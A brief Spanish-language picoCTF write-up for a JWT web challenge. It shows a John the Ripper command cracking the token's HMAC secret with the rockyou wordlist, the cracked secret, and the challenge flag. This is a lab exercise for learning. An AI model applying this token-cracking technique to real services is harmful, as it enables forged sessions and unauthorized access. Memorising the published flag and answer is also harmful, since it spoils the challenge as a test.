## Descripción
Check the admin scratchpad! `https://jupiter.challenges.picoctf.org/problem/63090/` or http://jupiter.challenges.picoctf.org:63090

## Solución
Se inspeccionan las cookies, se copia el jwt generado.

A través de kali, se utiliza una herramienta llamada jhon y un archivo txt que contiene una lista de palabras que son las contraseñas más usadas.

```bash
┌──(alberto㉿Nova)-[~]
└─$ john token.txt -w=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ilovepico        (?)     
1g 0:00:00:02 DONE (2023-03-14 13:02) 0.4807g/s 3556Kp/s 3556Kc/s 3556KC/s iloverob4live345..ilovemymother@
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

picoCTF{jawt_was_just_what_you_thought_f859ab2f}

## Notas Adicionales
|comando|descripcion|
|---|---|
|xx|xx|

## Referencias
- [JWT](https://en.wikipedia.org/wiki/JSON_Web_Token)
